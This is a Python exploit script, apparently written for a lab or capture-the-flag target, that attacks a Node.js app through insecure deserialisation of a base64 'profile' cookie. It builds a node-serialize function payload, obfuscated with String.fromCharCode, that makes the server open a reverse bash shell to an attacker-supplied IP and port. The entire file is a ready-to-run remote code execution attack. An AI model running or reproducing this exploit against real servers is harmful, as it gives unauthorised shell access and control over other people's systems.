#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
import json
from urllib.parse import urlencode, quote_plus


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)


args = parser.parse_args()

s = requests.Session()

def serialize_cookie(target, ip, port):
       
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    cookies = {"profile": "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D"}

    # first request with the cookie
    r = s.get(target, headers=headers, cookies=cookies)
    
    if "Hey Dummy 2 + 2 is 22" in r.text:
        print("[INFO] Request was made successfully, we got the initial cookie")
    else:
        print("[ERROR] Requested Failed! Check your target")
        sys.exit(1)

    # NodeJS RCE payload
    payload = 'var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(' + str(port) + ', "' + str(ip) + '", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
    charcode_tuple_payload = tuple([ord(c) for c in payload])

    # Append the payload into the JSON format
    jsonpayload = "_$$ND_FUNC$$_function (){ eval(String.fromCharCode" + str(charcode_tuple_payload) + ")}()"

    rce_payload = {
        "username":str(jsonpayload),
        "country":"Portugal",
        "city":"Lisboa",
        "num":"2"}

    base64_rce = base64.urlsafe_b64encode(json.dumps(rce_payload).encode()).decode()

    cookies = {"profile": base64_rce}

    print("Sending the request with the malicious cookie, check your shell at " + str(ip) + ":" + str(port) + " :)")
    
    r = s.get(target, headers=headers, cookies=cookies)
    



def main():
    # This time there was no need for more functions 
	serialize_cookie(args.target, args.IP, args.port)

if __name__ == "__main__":
    main()

